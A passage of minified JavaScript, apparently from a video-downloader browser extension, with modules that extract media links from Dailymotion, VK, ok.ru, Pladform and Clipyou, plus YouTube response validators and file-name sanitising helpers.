P(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}function F(e,t){F=function(e,t){return new i(e,void 0,t)};var r=A(RegExp),n=RegExp.prototype,o=new WeakMap;function i(e,t,n){var i=r.call(this,e,t);return o.set(i,n||o.get(e)),i}function a(e,t){var r=o.get(t);return Object.keys(r).reduce(function(t,n){return t[n]=e[r[n]],t},Object.create(null))}return Object(S.a)(i,r),i.prototype.exec=function(e){var t=n.exec.call(this,e);return t&&(t.groups=a(t,this)),t},i.prototype[Symbol.replace]=function(e,t){if("string"==typeof t){var r=o.get(this);return n[Symbol.replace].call(this,e,t.replace(/\$<([^>]+)>/g,function(e,t){return"$"+r[t]}))}if("function"==typeof t){var i=this;return n[Symbol.replace].call(this,e,function(){var e=[];return e.push.apply(e,arguments),"object"!=typeof e[e.length-1]&&e.push(a(e,i)),t.apply(this,e)})}return n[Symbol.replace].call(this,e,t)},F.apply(this,arguments)}var D=Object(m.a)("DailymotionComEmbed"),U=function(){function e(t){Object(w.a)(this,e),this.engine=t}return Object(x.a)(e,[{key:"getDailymotionLinks",value:function(e,t){var r=this;return this.getEmbedVideoInfo(e.extVideoId,e.metadata,function(n){n||(n={}),r.addUmmyLinks(n.links,e.extVideoId);var o={action:e.action,extVideoId:e.extVideoId,links:n.links,title:n.title,duration:n.duration};t(o)}),!0}},{key:"addUmmyLinks",value:function(e,t){}},{key:"getMetadata",value:function(e){return R({url:"https://www.dailymotion.com/player/metadata/video/".concat(encodeURIComponent(e)),json:!0}).then(function(e){return e.body})}},{key:"getInfoFromMetadata",value:function(e){var t={title:V(e.title),duration:_(e.duration),links:[]};if(e.qualities&&e.qualities.auto&&e.qualities.auto.length){var r=e.qualities.auto.pop();if("application/x-mpegURL"===r.type)return R({url:r.url}).then(function(e){var r,n=function(e,t){var r;if("undefined"==typeof Symbol||null==e[Symbol.iterator]){if(Array.isArray(e)||(r=function(e,t){if(e){if("string"==typeof e)return P(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?P(e,t):void 0}}(e))||t&&e&&"number"==typeof e.length){r&&(e=r);var n=0,o=function(){};return{s:o,n:function(){return n>=e.length?{done:!0}:{done:!1,value:e[n++]}},e:function(e){throw e},f:o}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var i,a=!0,s=!1;return{s:function(){r=e[Symbol.iterator]()},n:function(){var e=r.next();return a=e.done,e},e:function(e){s=!0,i=e},f:function(){try{a||null==r.return||r.return()}finally{if(s)throw i}}}}(T(e.body,F(/CODECS="(.*?)",RESOLUTION=(.*?),NAME="(.*?)",PROGRESSIVE\x2DURI="(.*?)"/gm,{codecs:1,resolution:2,quality:3,url:4})));try{var o=function(){var e=r.value.groups,n=e.quality,o=e.codecs,i=e.resolution,a=e.url,s=i,u=/\.(.{0,7})#cell/.exec(a);u[1]&&(s=u[1]),t.links.find(function(e){return e.height===parseInt(n)})||t.links.push({name:"".concat(o,"-").concat(i),ext:s,height:parseInt(n),url:V(a)})};for(n.s();!(r=n.n()).done;)o()}catch(e){n.e(e)}finally{n.f()}return t.links.sort(function(e,t){return e.height>t.height?-1:1}),t})}return Promise.resolve(t)}},{key:"getEmbedVideoInfo",value:function(e,t,r){var n=this;return Promise.resolve().then(function(){return t||n.getMetadata(e)}).then(function(e){return n.getInfoFromMetadata(e)}).then(function(e){r(e)},function(t){D.error("getEmbedVideoInfo error",e,t),r()})}}]),e}(),q=function(e,t){var r=null;r=!(t=t||{}).params&&/\?/.test(e)?e.match(/[^?]*\?(.*)/)[1]:e;for(var n=t.sep||"&",o=r.split(n),i={},a=0,s=o.length;a<s;a++){var u=o[a].split("="),c=u[0],l=u[1]||"";if(t.noDecode)i[c]=l;else{try{c=decodeURIComponent(c)}catch(e){c=unescape(c)}try{i[c]=decodeURIComponent(l)}catch(e){i[c]=unescape(l)}}}return i},N=function(e){var t=function(e){for(var t=e[0],r=0;;){if(-1===(r=e.indexOf(t,r+1))){r=e.length;break}if("\\"!==e[r-1])break}var n="";try{n='"'===t?JSON.parse('"'+e.substr(1,r-1)+'"'):JSON.parse('"'+e.substr(1,r-1).replace(/\\'/g,"'").replace(/"/g,'\\"')+'"')}catch(e){}return{data:n,i:r}},r={"[":function(e){var t,n,o,i,a,s=[],u="";for(i=1;o=e[i];i++)if(n=r[o])t=n(e.substr(i)),u=JSON.stringify(t.data),i+=t.i;else{if("]"===o)break;","===o?(u&&s.push(u),u=""):u+=o}u&&s.push(u);try{a=JSON.parse("["+s.join(",")+"]")}catch(e){}return{data:a||[],i:i}},"{":function(e){var t,n,o,i,a,s=[],u=["",""],c=0;for(i=1;o=e[i];i++)if(n=r[o])t=n(e.substr(i)),u[c]=0===c?t.data:JSON.stringify(t.data),i+=t.i;else{if("}"===o)break;":"===o?c=1:","===o?(s.push(JSON.stringify(u[0])+":"+u[1]),u=["",""],c=0):u[c]=(u[c]+o).trim()}u[1]&&s.push(JSON.stringify(u[0])+":"+u[1]);try{a=JSON.parse("{"+s.join(",")+"}")}catch(e){}return{data:a||{},i:i}},'"':t,"'":t};return{some:function(t){return function(e,t){for(var n,o,i=0;o=e[i];i++)if(("["===o||"{"===o)&&(i+=(n=r[o](e.substr(i))).i,t(n.data)))return!0}(e,t)}}},B=/\\(\\u[0-9a-f]{4})/g,H=function(e){try{return JSON.parse(JSON.stringify(e).replace(B,"$1"))}catch(t){return e}},$={maxLength:80,rtrim:/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,illegalRe:/[\/?<>\\:*|"~\u202B]/g,controlRe:/[\x00-\x1f\x80-\x9f]/g,zeroWidthJoinerRe:/\u200D/g,reservedRe:/^\.+/,trim:function(e){return e.replace(this.rtrim,"")},partsRe:/^(.+)\.([a-z0-9]{1,4})$/i,getParts:function(e){return e.match(this.partsRe)},specialChars:"nbsp,iexcl,cent,pound,curren,yen,brvbar,sect,uml,copy,ordf,laquo,not,shy,reg,macr,deg,plusmn,sup2,sup3,acute,micro,para,middot,cedil,sup1,ordm,raquo,frac14,frac12,frac34,iquest,Agrave,Aacute,Acirc,Atilde,Auml,Aring,AElig,Ccedil,Egrave,Eacute,Ecirc,Euml,Igrave,Iacute,Icirc,Iuml,ETH,Ntilde,Ograve,Oacute,Ocirc,Otilde,Ouml,times,Oslash,Ugrave,Uacute,Ucirc,Uuml,Yacute,THORN,szlig,agrave,aacute,acirc,atilde,auml,aring,aelig,ccedil,egrave,eacute,ecirc,euml,igrave,iacute,icirc,iuml,eth,ntilde,ograve,oacute,ocirc,otilde,ouml,divide,oslash,ugrave,uacute,ucirc,uuml,yacute,thorn,yuml".split(","),specialCharsList:[["amp","quot","lt","gt"],[38,34,60,62]],specialCharsRe:/&([^;]{2,6});/g,decodeSpecialChars:function(e){var t=this;return e.replace(this.specialCharsRe,function(e,r){var n=null;if("#"===r[0])return n=parseInt(r.substr(1)),isNaN(n)?"":String.fromCharCode(n);var o=t.specialCharsList[0].indexOf(r);return-1!==o?(n=t.specialCharsList[1][o],String.fromCharCode(n)):-1!==(o=t.specialChars.indexOf(r))?(n=o+160,String.fromCharCode(n)):""})},decodeHexChars:function(e){return e.replace(/(\\x[a-zA-Z0-9]{2})/g,function(e,t){var r=t;try{r=String.fromCharCode(parseInt("0x"+r.substr(2),16))}catch(e){}return r})},rnRe:/\r?\n/g,re1:/[*?"]/g,re2:/</g,re3:/>/g,spaceRe:/[\s\t\uFEFF\xA0]+/g,dblRe:/(\.|!|\?|_|,|-|:|\+){2,}/g,re4:/[.,:;\/\-_+=']$/g,modify:function(e){if(!e)return"";e=H(e);try{e=decodeURIComponent(e)}catch(t){e=unescape(e)}if(e=(e=this.decodeSpecialChars(e)).replace(this.rnRe," "),(e=(e=this.trim(e)).replace(this.zeroWidthJoinerRe,"").replace(this.re1,"").replace(this.re2,"(").replace(this.re2,"(").replace(this.re3,")").replace(this.spaceRe," ").replace(this.dblRe,"$1").replace(this.illegalRe,"_").replace(this.controlRe,"").replace(this.reservedRe,"").replace(this.re4,"")).length>this.maxLength){var t=this.getParts(e);t&&3==t.length&&(t[1]=t[1].substr(0,this.maxLength),e=t[1]+"."+t[2])}return this.trim(e)}},G=(Object(m.a)("ExperimentExecutor"),function(){return parseInt(Date.now()/1e3,10)});function J(e,t){return new RegExp(function(e){return e.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&").replace(/-/g,"\\x2d")}(e).replace(new RegExp(t,"g"),"[$\\w]+"))}function W(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function z(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,n)}return r}function*Y(e,t){!0===e||(!1===e?yield t.fail():yield*e)}function K(e){const{done:t,value:r}=e.next();return t?void 0:r}r(25),r(26),r(27),Object(m.a)("app:ThrottleSigDecipher").t,J("function(V,V){V=(V%V.length+V.length)%V.length;V.splice(V,1)}","V"),J("function(V,V){for(V=(V%V.length+V.length)%V.length;V--;)V.unshift(V.pop())}","V"),J("function(V,V){V=(V%V.length+V.length)%V.length;V.splice(-V).reverse().forEach(function(V){V.unshift(V)})}","V"),J("function(V,V){V.push(V)}","V"),J("function(V){V.reverse()}","V"),J("function(V){for(var V=V.length;V;)V.push(V.splice(--V,1)[0])}","V"),J("function(V,V){V=(V%V.length+V.length)%V.length;V.splice(0,1,V.splice(V,1,V[0])[0])}","V"),J("var V=V[0];V[0]=V[V];V[V]=V}","V"),J("this.push(V[V]=V[(V.indexOf(V)-V.indexOf(this[V])+V-32+V--)%V.length])","V"),J("V.push(String.fromCharCode(V))","V"),J('function(V,V,V){var V=V.length;V.forEach(function(V,V,V){this.push(V[V]=V[(V.indexOf(V)-V.indexOf(this[V])+V+V--)%V.length])},V.split(""))}',"V"),new Map,new Map;class Z{constructor(e){const{type:t,schema:r,coercer:n=(e=>e),validator:o=(()=>[]),refiner:i=(()=>[])}=e;this.type=t,this.schema=r,this.coercer=n,this.validator=o,this.refiner=i}}class Q extends TypeError{constructor(e,t){const{path:r,value:n,type:o,branch:i}=e,a=function(e,t){if(null==e)return{};var r,n,o=function(e,t){if(null==e)return{};var r,n,o={},i=Object.keys(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||(o[r]=e[r]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(n=0;n<i.length;n++)r=i[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(o[r]=e[r])}return o}(e,["path","value","type","branch"]);let s;super(`Expected a value of type \`${o}\`${r.length?` for \`${r.join(".")}\``:""} but received \`${JSON.stringify(n)}\`.`),this.value=n,Object.assign(this,a),this.type=o,this.path=r,this.branch=i,this.failures=function(){return s||(s=[e,...t]),s},this.stack=(new Error).stack,this.__proto__=Q.prototype}}function X(e,t){const r=function(e,t,r=!1){r&&(e=t.coercer(e));const n=function*e(t,r,n=[],o=[]){const{type:i}=r,a={value:t,type:i,branch:o,path:n,fail:(e={})=>(function(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?z(Object(r),!0).forEach(function(t){W(e,t,r[t])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):z(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e})({value:t,type:i,path:n,branch:[...o,t]},e),check(t,r,i,a){const s=void 0!==i?[...n,a]:n,u=void 0!==i?[...o,i]:o;return e(t,r,s,u)}},s=Y(r.validator(t,a),a),u=K(s);u?(yield u,yield*s):yield*Y(r.refiner(t,a),a)}(e,t),o=K(n);if(o)return[new Q(o,n),void 0];return[void 0,e]}(e,t);if(r[0])throw r[0]}function ee(e,t){const r=t.coercer(e);return X(r,t),r}function te(e){return new Z({type:`Array<${e?e.type:"unknown"}>`,schema:e,coercer:t=>e&&Array.isArray(t)?t.map(t=>ee(t,e)):t,*validator(t,r){if(Array.isArray(t)){if(e)for(const[n,o]of t.entries())yield*r.check(o,e,t,n)}else yield r.fail()}})}function re(){return ce("boolean",e=>"boolean"==typeof e)}function ne(){return ce("never",()=>!1)}function oe(){return ce("number",e=>"number"==typeof e&&!isNaN(e))}function ie(e){const t=e?Object.keys(e):[],r=ne();return new Z({type:e?`Object<{${t.join(",")}}>`:"Object",schema:e||null,coercer:e?le(e):e=>e,*validator(n,o){if("object"==typeof n&&null!=n){if(e){const i=new Set(Object.keys(n));for(const r of t){i.delete(r);const t=e[r],a=n[r];yield*o.check(a,t,n,r)}for(const e of i){const t=n[e];yield*o.check(t,r,n,e)}}}else yield o.fail()}})}function ae(e){return new Z({type:`${e.type}?`,schema:e.schema,validator:(t,r)=>void 0===t||r.check(t,e)})}function se(e){e instanceof Z&&(e=e.schema);const t=Object.keys(e),r=ne();return new Z({type:`Partial<{${t.join(",")}}>`,schema:e,coercer:le(e),*validator(n,o){if("object"!=typeof n||null==n)return void(yield o.fail());const i=new Set(Object.keys(n));for(const r of t){if(i.delete(r),!(r in n))continue;const t=e[r],a=n[r];yield*o.check(a,t,n,r)}for(const e of i){const t=n[e];yield*o.check(t,r,n,e)}}})}function ue(){return ce("string",e=>"string"==typeof e)}function ce(e,t){return new Z({type:e,validator:t,schema:null})}function le(e){const t=Object.keys(e);return r=>{if("object"!=typeof r||null==r)return r;const n={},o=new Set(Object.keys(r));for(const i of t){o.delete(i);const t=e[i],a=r[i];n[i]=ee(a,t)}for(const e of o)n[e]=r[e];return n}}function fe(e,t){var r;if("undefined"==typeof Symbol||null==e[Symbol.iterator]){if(Array.isArray(e)||(r=function(e,t){if(e){if("string"==typeof e)return de(e,t);var r=Object.prototype.toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?de(e,t):void 0}}(e))||t&&e&&"number"==typeof e.length){r&&(e=r);var n=0,o=function(){};return{s:o,n:function(){return n>=e.length?{done:!0}:{done:!1,value:e[n++]}},e:function(e){throw e},f:o}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var i,a=!0,s=!1;return{s:function(){r=e[Symbol.iterator]()},n:function(){var e=r.next();return a=e.done,e},e:function(e){s=!0,i=e},f:function(){try{a||null==r.return||r.return()}finally{if(s)throw i}}}}function de(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=new Array(t);r<t;r++)n[r]=e[r];return n}Error;var he=r(33),pe=(r(9),he.URL,Object(m.a)("YtMetadata").t,ce("FiniteNumber",function(e){return isFinite(Number(e))}));function me(e){var t=Z;e instanceof t&&(e=e.schema);var r=Object.keys(e);return new t({type:"Partial<{".concat(r.join(","),"}>"),schema:e,coercer:se(e).coercer,validator:d.a.mark(function t(n,o){var i,a,s,u,c;return d.a.wrap(function(t){for(;;)switch(t.prev=t.next){case 0:if("object"==typeof n&&null!=n){t.next=4;break}return t.next=3,o.fail();case 3:return t.abrupt("return");case 4:i=fe(r),t.prev=5,i.s();case 7:if((a=i.n()).done){t.next=14;break}return s=a.value,u=e[s],c=n[s],t.delegateYield(o.check(c,u,n,s),"t0",12);case 12:t.next=7;break;case 14:t.next=19;break;case 16:t.prev=16,t.t1=t.catch(5),i.e(t.t1);case 19:return t.prev=19,i.f(),t.finish(19);case 22:case"end":return t.stop()}},t,null,[[5,16,19,22]])})})}var ve,ye=ie({itag:oe(),url:ae(ue()),type:ae(ue()),cipher:ae(ue()),signatureCipher:ae(ue()),mimeType:ue(),bitrate:ae(oe()),width:oe(),height:oe(),initRange:ae(ie({start:pe,end:pe})),indexRange:ae(ie({start:pe,end:pe})),lastModified:pe,contentLength:ae(pe),encryption:ae(ue()),drmFamilies:ae(te(ue())),quality:ue(),fps:oe(),qualityLabel:ue(),projectionType:ue(),averageBitrate:ae(oe()),colorInfo:ae(ie({primaries:ae(ue()),transferCharacteristics:ue(),matrixCoefficients:ae(ue())})),approxDurationMs:ae(pe),highReplication:ae(re()),xtags:ae(ue()),targetDurationSec:ae(oe()),maxDvrDurationSec:ae(oe()),loudnessDb:ae(oe())}),ge=ie({itag:oe(),url:ae(ue()),cipher:ae(ue()),signatureCipher:ae(ue()),mimeType:ue(),bitrate:ae(oe()),initRange:ae(ie({start:pe,end:pe})),indexRange:ae(ie({start:pe,end:pe})),lastModified:pe,contentLength:ae(pe),quality:ue(),encryption:ae(ue()),drmFamilies:ae(te(ue())),projectionType:ue(),averageBitrate:ae(oe()),highReplication:ae(re()),audioQuality:ue(),approxDurationMs:ae(pe),audioSampleRate:pe,audioChannels:oe(),targetDurationSec:ae(oe()),maxDvrDurationSec:ae(oe()),loudnessDb:ae(oe())}),be=(ie({probeUrl:ae(ue()),dashManifestUrl:ae(ue()),hlsManifestUrl:ae(ue()),expiresInSeconds:pe,formats:ae(te(ie({itag:oe(),url:ae(ue()),cipher:ae(ue()),signatureCipher:ae(ue()),mimeType:ue(),bitrate:ae(oe()),fps:ae(oe()),width:oe(),height:oe(),lastModified:pe,contentLength:ae(pe),quality:ue(),qualityLabel:ue(),projectionType:ue(),averageBitrate:ae(oe()),audioQuality:ue(),approxDurationMs:ae(pe),audioSampleRate:ae(pe),audioChannels:ae(oe())}))),adaptiveFormats:te((ve=function(e,t){return e&&/^video/.test(e.mimeType)?ye:ge},ce("Dynamic<...>",(e,t)=>t.check(e,ve(e))))),licenseInfos:ae(te(ie({drmFamily:ue(),url:ue(),drmParams:ue()}))),drmParams:ae(ue())}),me({itag:oe(),url:ae(ue()),cipher:ae(ue()),signatureCipher:ae(ue()),mimeType:ue(),fps:ae(oe()),width:ae(oe()),height:ae(oe()),bitrate:ae(oe()),contentLength:ae(pe)}));me({formats:ae(te(be)),adaptiveFormats:ae(te(be))}),me({playabilityStatus:ie(),streamingData:ae(ie()),videoDetails:ae(me({videoId:ue(),title:ue(),lengthSeconds:pe,channelId:ue(),shortDescription:ue(),thumbnail:me({thumbnails:te(me({url:ue(),width:oe(),height:oe()}))}),useCipher:ae(re()),author:ue()}))}),Object(m.a)("youtube_embed").t,r(9);var we=function(e,t){t&&!Array.isArray(t)&&(t=[t]);var r=[],n=-1,o=-1;do{if(-1!==(o=e.indexOf('"',o+1))){if("\\"===e[o-1])continue;-1!==n?(r.push(e.substr(n,o+1-n)),n=-1):n=o}else n=o}while(-1!==o);for(var i,a=[],s=function(e,r){if('""'!==e)try{t?t.every(function(t){return t.test(e)})&&a.push(JSON.parse(e)):a.push(JSON.parse(e))}catch(e){}},u=0;i=r[u];u++)s(i);return a},xe=function(e,t){var r=(new DOMParser).parseFromString("<html><body>"+e+"</body></html>","text/html");if(t){var n=r.head.querySelector("base");n||((n=r.createElement("base")).href=t,r.head.appendChild(n))}return r},ke=function(){function e(t){Object(w.a)(this,e),this.engine=t}return Object(x.a)(e,[{key:"getVKLinks",value:function(e,t){var r=this,n=this;return this._getVKLinks(e.extVideoId,function(o,i,a,s,u,c,l){if(l)return l.origRequest=e,void n.engine.onMessage(l,{},t);var f={action:e.action,extVideoId:o||e.extVideoId,links:i,title:a,duration:s,thumb:u,data:c,checkLinks:null};e.checkLinks&&i&&i.length>0?r.checkVkLinks(i,function(e,r){f.checkLinks=r,t(f)}):t(f)}),!0}},{key:"preparePladformLinks",value:function(e){var t,r={links:t=[]};return e.forEach(function(e){r.title=e.title,r.duration=e.duration,r.thumb=e.cover;var n=e.url.match(/[\w]+\.(mp4|flv)(?:\?|$)/i);n=n?n[1]:"flv",t.push({url:e.url,name:n.toUpperCase(),subname:e.quality.toUpperCase(),type:n.toLowerCase()})}),r}},{key:"_getVKLinks",value:function(e,t){var r=this,n=this,o=[],i=e,a=null,s="",u="",c=e,l=null,f=null,d=null,h=/^video(-?\d+)_(\d+)/i;return h.test(c)?(l=c.match(h),f=parseInt(l[1]),d=parseInt(l[2])):(l=c.match(/(?:^|&)oid=(-?\d+)/i),f=l&&parseInt(l[1]),l=c.match(/(?:^|&)id=(-?\d+)/i),d=l&&parseInt(l[1]),c="",f&&d&&(c="video"+f+"_"+d)),c?(i=c,Object(p.a)({url:"https://vk.com/"+c},function(e,l,h){if(e||!h)return t(c,o,i,u,s,null,a);var p=null;if(O(h,[/"vid":/,/"oid":/,/"md_title":/]).some(function(e){var t=e&&e[4]&&e[4].player&&e[4].player.params&&e[4].player.params[0];if(t&&t.vid===d&&t.oid===f)return p=t,!0}),p){var m=r.getVkLinksFromJson(p);if(o=m.links,i=m.title,s=m.thumb,u=m.duration,o.length)return t(c,o,i,u,s,p,a)}var v=null;O(h,[/"player"/]).some(function(e){var t=e&&e[4]&&e[4].player&&e[4].player.params&&e[4].player.params[0];if("string"==typeof t)return v=t,!0});var y,g=!1;if(v&&(y=/dailymotion.com\/(?:swf\/)?video\/([\w\d]+)/i.exec(v))&&(a={action:"getDailymotionLinks",extVideoId:y[1]},g=!0),g)return t(c,o,i,u,s,null,a);var b=!1;return we(h,/video_box_wrap/).some(function(e){var l=null,f=/<iframe([^>]+)>/i.exec(e);if(f){var d=f[1];if(l=/youtube.com\\?\/embed\\?\/([\w\-]+)/i.exec(d))return a={action:"getYoutubeLinks",extVideoId:l[1]},!0;if(l=/vimeo.com\\?\/video\\?\/(\d+)/i.exec(d))return a={action:"getVimeoLinks",extVideoId:l[1]},!0;if(l=/src="([^"]*pladform\.ru[^"]+)"/i.exec(d)){b=!0;var p=q(l[1]);return n.engine.modules.odnoklassniki.getPladformVideo({extVideoId:{playerId:p.pl,videoId:p.videoid}},function(e){e&&"getRutubeLinks"===e.action&&(e.links=null);var n=e&&e.links;if(!Array.isArray(n))return t(c,o,i,u,s,null,a);var l=r.preparePladformLinks(n);return t(c,l.links,l.title,l.duration,l.thumb,null,a)}),!0}}return!!function(e,t,r){r=r||[],Array.isArray(r)||(r=[r]);for(var n=[],o=new RegExp("(<"+e+"[^>]*>)","i"),i=new RegExp("(</"+e+">)","i"),a=null,s="",u="",c="",l=-1;(a=o.exec(t))&&(s=a[1],-1!==(l=t.indexOf(s)));)t=t.substr(l+s.length),(a=i.exec(t))&&(u=a[1],c=t.substr(0,t.indexOf(u)),n.push(s+c+u));return n.filter(function(e){return r.every(function(t){return t.test(e)})})}("video",e).some(function(e){var t=xe(e,"https://vk.com/"),r=!1;return[].slice.call(t.querySelectorAll("source")).forEach(function(e){var t=!1,n=e.src;if(t||/^(.*cdninstagram\.com.+mp4)/i.exec(n)&&(t=!0,r=!0,o.push({url:n,subname:"SD",name:"MP4",type:"mp4"})),!t){var a=/\.(\d+)\.mp4(?:$|\?)/.exec(n);if(a){t=!0,r=!0;var s=n,u=a[1],c=s.indexOf("?");-1!==c&&(s=s.substr(0,c)),we(h,/mv_title/).some(function(e){var t=/id="mv_title"[^>]*>([^<]+)/.exec(e);if(t)return i=$.decodeSpecialChars(H(t[1])),!0}),o.push({url:s,subname:u,name:"MP4",type:"mp4"})}}}),r})||(/var\sopts\s*=\s*/.test(e)&&(l=/url:\s*'(?:[^']+)dailymotion.com\/(?:swf\/)?video\/([\w\d]+)/.exec(e))?(a={action:"getDailymotionLinks",extVideoId:l[1]},!0):void 0)}),!b&&t(c,o,i,u,s,null,a)})):t(c,o,i)}},{key:"checkVkLinks",value:function(e,t){var r="";e&&e.length>0&&(r="mp4"==e[0].type?e[0].url:e.length>1?e[1].url:e[0].url),r?Object(p.a)({url:r,type:"HEAD"},function(e,n){t(r,!e)}):t()}},{key:"getVkLinksFromJsonMsg",value:function(e,t){return t(this.getVkLinksFromJson(e.json))}},{key:"getVkLinksFromJson",value:function(e){var t=[],r=e.vid,n=e.md_title||e.vid,o="";e.thumb?o=e.thumb:e.jpg&&(o=e.jpg);var i=/\.flv(\?|$)]/,a=/url([0-9]+)/;Object.keys(e).forEach(function(r){var n="",o="mp4",s=null;"extra_data"===r&&"99"===e.extra?(n="",e.live_mp4?n=e.live_mp4:e.postlive_mp4&&(n=e.postlive_mp4),n&&(s=e.hd?"HD":"SD",t.push({url:n,subname:s,name:o.toUpperCase(),type:o}))):"extra_data"===r&&"52"===e.extra?(s=e.hd?"HD":"SD",n=e.extra_data,i.test(n)&&(o="flv"),t.push({url:n,subname:s,name:o.toUpperCase(),type:o})):null!==(s=(s=r.match(a))&&s[1])&&(n=e[r],i.test(n)&&(o="flv"),t.push({url:n,subname:s,name:o.toUpperCase(),type:o}))});var s=e.duration;return{action:"getVKLinks",extVideoId:r,links:t,title:n,duration:s,thumb:o,data:e,checkLinks:null}}},{key:"getVkLinksFromData",value:function(e,t){var r=e.data,n=null;return O(r,[/"vid":/,/"oid":/,/"md_title":/]).some(function(e){if(e=e.player&&e.player.params&&e.player.params[0])return n=e,!0}),n?t(this.getVkLinksFromJson(n)):t()}}]),e}(),Oe=r(9),je=function(){function e(t){Object(w.a)(this,e),this.engine=t}var t;return Object(x.a)(e,[{key:"getOkVideoUrlFromMobile",value:(t=i(d.a.mark(function e(t){var r,n,o,i;return d.a.wrap(function(e){for(;;)switch(e.prev=e.next){case 0:return r=t.videoUrl,n=t.videoId,r=r.replace("/ok.ru","/m.ok.ru"),e.next=4,R(r);case 4:if(o=e.sent.body.match(/data-video=".*?"/g),Array.isArray(o)){e.next=7;break}return e.abrupt("return");case 7:return i=o.map(function(e){try{var t=e.replace(/data-video="(.*?)"/,"$1").replace(/&quot;/g,'"');return JSON.parse(t)}catch(e){return!1}}).filter(Boolean).find(function(e){return parseInt(e.movieId)===parseInt(n)}),e.abrupt("return",i&&i.videoSrc);case 9:case"end":return e.stop()}},e)})),function(e){return t.apply(this,arguments)})},{key:"getOdnoklassnikiLinks",value:function(e,t){return this._getOdnoklassnikiLinks(e.extVideoId,function(r){var n={action:e.action,extVideoId:e.extVideoId,links:r,title:e.title};t(n)}),!0}},{key:"getOdnoklassnikiAudioLinks",value:function(e,t){return this._getOdnoklassnikiAudioLinks(e.url,e.trackId,e.jsessionId,function(r){var n={action:e.action,trackId:e.trackId,jsessionId:e.jsessionId,data:r};t(n)}),!0}},{key:"_getOdnoklassnikiLinks",value:function(e,t){e?Object(p.a)({url:"http://in.video.mail.ru/cgi-bin/video/oklite?eid="+e},function(r,n,o){if(r||!o)return t(null);var i="http://www.okcontent.video.mail.ru/media/",a=o.match(/\$vcontentHost=([^\s"'<>]+)/i);a&&a.length>1&&(i="http://"+a[1]+"/media/"),i+=e;var s=[],u="",c=o.match(/\$height=([0-9]+)/);c&&c.length>1&&(u=c[1]),s.push({url:i+"-v.mp4",name:"SD",ext:"FLV",subname:u}),o.search(/\$HDexist=1/i)>-1&&(u="",(c=o.match(/\$HDheight=([0-9]+)/))&&c.length>1&&(u=c[1]),s.push({url:i+"-hv.mp4",name:"HD",ext:"MP4",subname:u})),s&&t(s)}):t(null)}},{key:"_getOdnoklassnikiAudioLinks",value:function(e,t,r,n){if(!t||!r)return n(null);Object(p.a)({url:"http://wmf1.ok.ru/play;jsessionid="+r+"?tid="+t,json:!0},function(e,t,r){if(e||!r)return n(null);n(r)})}},{key:"getOkAudioListLinks",value:function(e,t){var r=[],n=e.trackIdArr,o=e.jsessionId;if(!Array.isArray(n)||"string"!=typeof o||!n.length)return t(r);for(var i,a=n.length,s=0,u=function(e){e&&r.push(e),++s===a&&t(r)},c=0;i=n[c];c++)this._getOdnoklassnikiAudioLinks(void 0,i,o,u);return!0}},{key:"getClipyouLinks",value:function(e,t,r,n,o){Object(p.a)({url:"http://media.clipyou.ru/api/player/secure_link?record_id="+e+"&type=mp4&resource_hash="+t,json:!0},function(e,t,i){if(e||!i||!Array.isArray(i.data)||!i.data.length)return o();var a=[];i.data.forEach(function(e){a.push({quality:r,url:e,title:n})}),o(a)})}},{key:"getClipyouHash",value:function(e,t){Object(p.a)({url:"http://media.clipyou.ru/api/player_data.json?id="+e},function(e,r,n){if(e||!n)return t();if(!(n=n.match('resource_hash".?:.?"([^"]*)"'))||n.length<2)return t();var o=n[1];t(o)})}},{key:"getPladformVideo",value:function(e,t){var r=this,n={action:e.action,extVideoId:e.extVideoId,links:[],title:e.title},o=function(){t(n)},i=e.extVideoId.playerId,a=e.extVideoId.videoId;return Object(p.a)({url:"http://out.pladform.ru/getVideo?pl="+i+"&videoid="+a,xml:!0},function(e,t,i){if(e||!i)return o();var a=i.querySelectorAll("src");if(0===a.length)return o();var s=i.querySelector("cover")||void 0;s&&(s=s.textContent)&&"//"===s.substr(0,2)&&(s="http:"+s);var u=i.querySelector("time")||void 0;u=u&&u.textContent;var c=i.querySelector("title");(c=c&&c.textContent)&&(n.title=c);var l=a[0],f=l.getAttribute("type"),d=l.textContent||"",h=l.getAttribute("quality");if(l){if("clipyou"===f)return r.getClipyouHash(d,function(e){if(!e)return o();r.getClipyouLinks(d,e,h,c,function(e){n.links=e,o()})});if("rutube"===f){var p=i.querySelector("external_embed");return(p=p&&p.textContent)&&(n.action="getRutubeLinks",n.links=[p]),o()}}for(var m,v=["ld","sd"],y=["360","720"],g=0;m=a[g];g++){d=m.textContent||"",h=m.getAttribute("quality"),/^\d+p$/.test(h)&&(h=h.match(/^(\d+)p$/)[1]);var b=v.indexOf(h);-1!==b&&(h=y[b]),"video"===(f=m.getAttribute("type"))&&n.links.push({url:d,quality:h,title:c,cover:s,duration:u})}return 